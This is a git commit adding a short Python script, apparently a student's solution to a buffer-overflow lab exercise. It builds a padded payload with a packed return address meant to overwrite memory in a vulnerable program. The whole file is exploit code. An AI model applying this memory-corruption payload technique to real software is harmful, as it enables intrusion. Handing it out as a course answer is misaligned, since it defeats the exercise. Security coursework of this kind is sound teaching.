8e42fd396bd295b934186754e3b6759685dffd96
Tate Reynolds <tate.reynolds@gmail.com>
2023-02-18 21:48:50 -0700

    sol0

---
+++ sol0.py
@@ -0,0 +1,12 @@
+import sys
+from struct import pack
+from shellcode import shellcode
+
+# Implement your attack here!
+name = b'u0578264' + b'A' * 6  # pad the name with A's to fill the buffer
+payload = name + pack("<I", 0x804a020) + b'A' * 4 + \
+    b'A+'  # construct the payload
+print(payload)
+
+# Launch the attack!
+sys.stdout.buffer.write(payload)
